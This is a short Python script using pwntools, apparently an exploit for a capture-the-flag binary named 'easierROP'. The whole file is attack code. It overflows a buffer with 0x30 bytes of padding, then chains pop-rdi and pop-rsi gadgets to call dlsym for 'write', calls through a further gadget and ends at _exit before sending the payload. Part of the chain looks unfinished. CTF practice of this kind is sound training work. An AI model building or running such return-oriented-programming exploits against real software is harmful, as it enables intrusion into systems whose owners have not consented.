from pwn import *

context.log_level = 'debug'

z = process('./easierROP')
y = ELF('./easierROP')
l = ELF('./libc.so.6')

prdi = 0x0000000000400cb3
prsi = 0x0000000000400cb1
crax = 0x00000000004006f0

pfuncs = 0x6020c0

payload = flat(
    b'a'*0x30,

    prdi, 0,
    prsi, next(y.search(b'write\0')),
    y.sym.dlsym,

    prdi, 2,
    prsi,
    crax,


    y.sym._exit,
        )
z.send(payload)

z.recv()
